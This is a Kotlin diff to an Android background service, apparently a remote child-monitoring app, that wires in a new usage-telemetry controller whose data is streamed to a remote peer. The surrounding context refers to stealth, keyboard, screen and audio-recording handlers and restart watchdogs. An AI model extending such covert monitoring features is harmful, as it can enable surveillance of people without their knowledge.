@@ -43,6 +43,8 @@ import com.nexus.child.components.vibrateflash.VibrateFlashCommandHandler
 import com.nexus.child.components.vibrateflash.VibrateFlashController
 import com.nexus.child.components.wallpaper.WallpaperCommandHandler
 import com.nexus.child.components.wallpaper.WallpaperController
+import com.nexus.child.components.wellbeing.WellbeingCommandHandler
+import com.nexus.child.components.wellbeing.WellbeingController
 import com.nexus.child.service.receiver.ServiceRestartReceiver
 import com.nexus.child.service.receiver.UnlockReceiver
 import com.nexus.child.service.watchdog.WatchdogService
@@ -207,6 +209,8 @@ class NexusBackgroundService : Service() {
     private var stealthCommandHandler: StealthCommandHandler? = null
     private var appLockController: AppLockController? = null
     private var appLockCommandHandler: AppLockCommandHandler? = null
+    private var wellbeingController: WellbeingController? = null
+    private var wellbeingCommandHandler: WellbeingCommandHandler? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -638,7 +642,18 @@ class NexusBackgroundService : Service() {
             dataSender = { msg -> rtcManager.sendData(msg) }
         )
 
-        Log.d(TAG, "All 13 hardware monitoring controllers successfully initialized in background")
+        // Digital Wellbeing Usage Telemetry
+        val wbCtrl = WellbeingController(
+            context = this,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+        wellbeingController = wbCtrl
+        wellbeingCommandHandler = WellbeingCommandHandler(
+            controller = wbCtrl,
+            dataSender = { msg -> rtcManager.sendData(msg) }
+        )
+
+        Log.d(TAG, "All 14 hardware monitoring controllers successfully initialized in background")
     }
 
     /**
@@ -669,7 +684,8 @@ class NexusBackgroundService : Service() {
                 screenCommandHandler?.handleCommand(command) == true ||
                 keyboardCommandHandler?.handleCommand(command) == true ||
                 stealthCommandHandler?.handleCommand(command) == true ||
-                appLockCommandHandler?.handleCommand(command) == true
+                appLockCommandHandler?.handleCommand(command) == true ||
+                wellbeingCommandHandler?.handleCommand(command) == true
 
         if (!handled) {
             Log.d(TAG, "Unhandled command ignored: $command")
@@ -707,6 +723,7 @@ class NexusBackgroundService : Service() {
         screenCommandHandler?.onPeerDisconnected()
         keyboardCommandHandler?.onPeerDisconnected()
         appLockCommandHandler?.onPeerDisconnected()
+        wellbeingCommandHandler?.onPeerDisconnected()
 
         // Critical: Close active PeerConnection so WebRTC C++ native VoiceEngine
         // destroys its internal audio channels and halts AudioRecord hardware recording!
@@ -720,6 +737,8 @@ class NexusBackgroundService : Service() {
      * Tears down all active resources when the service is stopped.
      */
     private fun cleanupEngine() {
+        wellbeingCommandHandler?.cleanup()
+        wellbeingController?.cleanup()
         appLockCommandHandler?.cleanup()
         appLockController?.cleanup()
         keyboardCommandHandler?.cleanup()
